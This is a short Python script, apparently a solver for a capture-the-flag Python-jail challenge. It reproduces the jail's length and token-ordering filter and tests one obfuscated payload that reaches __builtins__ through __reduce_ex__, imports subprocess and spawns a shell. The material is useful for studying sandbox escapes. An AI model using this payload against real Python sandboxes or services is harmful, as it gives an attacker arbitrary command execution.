import re, sys
def ok(code):
    if len(code) > 100 or not code.isascii():
        return False, "len/ascii"
    min_len = 100
    toks = []
    for m in re.finditer(r"\w+", code):
        toks.append(m[0])
        if len(m[0]) >= min_len:
            return False, "order at %r" % m[0]
        min_len = len(m[0])
    return True, toks
# Stage 1: one builtins reference; key via padded token + [()==():] slice (True=1, no digits)
# subprocess.run(['sh']) executes stage-2 stdin lines as shell commands.
cands = [
 "().__reduce_ex__((()==())+(()==()))[()>()].__builtins__['x__import__'[()==():]]('subprocess').run(['sh'])",
]
for c in cands:
    print(len(c), ok(c))
